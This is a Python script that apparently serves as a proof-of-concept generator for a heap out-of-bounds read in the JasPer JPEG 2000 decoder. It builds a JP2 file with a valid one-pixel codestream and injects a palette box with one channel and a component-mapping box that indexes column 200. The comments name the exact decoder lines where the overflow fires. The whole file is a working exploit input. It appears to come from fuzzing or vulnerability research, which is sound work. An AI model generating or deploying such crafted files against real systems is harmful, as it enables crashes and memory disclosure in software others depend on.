#!/usr/bin/env python3
"""
VULN 002 PoC generator: Heap OOB read via CMAP pcol unchecked against PCLR numchans.

Craft a JP2 file where CMAP entry has pcol=200 but PCLR only has numchans=1.
The OOB read fires at jp2_dec.c:372 and :377 when cmapent->pcol (200) is used
as a column index into pclrd->lutdata[] and pclrd->bpc[] which are only 1 wide.

Strategy:
- Use a jasper-generated valid codestream for a 1x1 grayscale image
  (so jpc_decode() succeeds and we reach the CMAP processing code)
- Inject malicious PCLR (numchans=1) and CMAP (pcol=200) sub-boxes into jp2h
"""
import struct

def box(box_type, data):
    """Build a JP2 box: 4-byte big-endian length + 4-byte type + data.
    Length includes the 8-byte header.
    """
    length = 8 + len(data)
    return struct.pack('>I', length) + box_type + data

# ---------------------------------------------------------------------------
# Valid 1x1 grayscale JPEG 2000 codestream (164 bytes), generated by JasPer
# 2.0.12 and extracted verbatim.  Parses cleanly through jpc_decode() so that
# the post-decode PCLR/CMAP path in jp2_decode() is reached.
# ---------------------------------------------------------------------------
VALID_CODESTREAM = bytes.fromhex(
    "ff4fff510029000000000001000000010000000000000000000000010000000100000000000000000001070101"
    "ff640022000143726561746f723a204a61735065722056657273696f6e20322e302e3132"
    "ff52000c00000001000504040001"
    "ff5c00134040484850484850484850484850484850"
    "ff90000a00000000002e0001"
    "ff5d0014004040000000000000000000000000000000"
    "ff93cfb40809978080808080"
    "ffd9"
)

# ---------------------------------------------------------------------------
# JP2 Signature box
# ---------------------------------------------------------------------------
sig_box = box(b'jP  ', b'\x0D\x0A\x87\x0A')

# ---------------------------------------------------------------------------
# File Type box: brand=jp2, minor=0, compat=jp2
# ---------------------------------------------------------------------------
ftyp_box = box(b'ftyp', b'jp2 ' + struct.pack('>I', 0) + b'jp2 ')

# ---------------------------------------------------------------------------
# JP2 Header superbox sub-boxes
# ---------------------------------------------------------------------------

# ihdr: height=1, width=1, ncomp=1, bpc=7
ihdr_box = box(b'ihdr',
    struct.pack('>I', 1)    # height
    + struct.pack('>I', 1)  # width
    + struct.pack('>H', 1)  # ncomp
    + struct.pack('B', 7)   # bpc=7 (8-bit unsigned, JP2_DTYPETOBPC(7)=7)
    + struct.pack('B', 7)   # comptype=7 (JP2_IHDR_COMPTYPE)
    + struct.pack('B', 0)   # unk
    + struct.pack('B', 0)   # ip
)

# colr: meth=1, EnumCS=17 (sGrey — matches 1-component codestream)
colr_box = box(b'colr',
    struct.pack('B', 1)         # meth=1 (enumerated colorspace)
    + struct.pack('B', 0)       # prec
    + struct.pack('B', 0)       # approx
    + struct.pack('>I', 17)     # EnumCS=17 (sGrey)
)

# pclr: NE=4 palette entries, NPC=1 channel (numchans=1)
# Allocates: bpc[1], lutdata[4*1]
pclr_box = box(b'pclr',
    struct.pack('>H', 4)        # NE=4
    + struct.pack('B', 1)       # NPC=1
    + struct.pack('B', 7)       # Btyp[0]=7 (8-bit unsigned)
    + bytes([0x00, 0x40, 0x80, 0xFF])  # lutdata[4]
)

# cmap: 1 entry — cmp=0, mtyp=1 (JP2_CMAP_PALETTE), pcol=200
# pcol=200 >= numchans=1  →  OOB read at jp2_dec.c:372, 377
cmap_box = box(b'cmap',
    struct.pack('>H', 0)        # cmp=0
    + struct.pack('B', 1)       # mtyp=1 (JP2_CMAP_PALETTE)
    + struct.pack('B', 200)     # pcol=200  ← trigger
)

# jp2h superbox wraps sub-boxes in required order
jp2h_box = box(b'jp2h', ihdr_box + colr_box + pclr_box + cmap_box)

# ---------------------------------------------------------------------------
# Contiguous Codestream box (length=0 → extends to EOF)
# ---------------------------------------------------------------------------
jp2c_box = struct.pack('>I', 0) + b'jp2c' + VALID_CODESTREAM

# ---------------------------------------------------------------------------
# Assemble
# ---------------------------------------------------------------------------
jp2_file = sig_box + ftyp_box + jp2h_box + jp2c_box

output_path = '/data/ylwang/non-textfuzz/target/_poc/jasper/src_appl_jasper_c/vuln_002.jp2'
with open(output_path, 'wb') as f:
    f.write(jp2_file)

print(f"Written {len(jp2_file)} bytes to {output_path}")
print(f"  PCLR: numchans=1, numlutents=4")
print(f"  CMAP: mtyp=1 (JP2_CMAP_PALETTE), pcol=200  [OOB: 200 >= numchans=1]")
print(f"  Expected: heap-buffer-overflow at jp2_dec.c:372 (lutdata) and :377 (bpc)")
